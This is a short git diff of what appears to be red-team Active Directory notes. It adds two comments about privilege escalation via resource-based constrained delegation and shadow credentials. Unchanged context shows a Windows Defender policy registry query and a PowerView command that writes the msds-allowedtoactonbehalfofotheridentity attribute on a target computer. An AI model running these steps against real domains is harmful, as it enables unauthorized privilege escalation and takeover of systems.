@@ -308,6 +308,7 @@ reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyw
 ### RBCD
 
 //so we will privesc via resource-based constrained delegation
+//another path is shadow creds
 
 
 ```
@@ -356,6 +357,8 @@ $SD.GetBinaryForm($SDBytes, 0)
 ```
 Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
 ```
+
+//exploit steps are available on the bloodhound GUI
 
 
 <img width="603" height="290" alt="image" src="https://github.com/user-attachments/assets/d1f42497-4b71-4b78-9e2a-7629de8cb58f" />
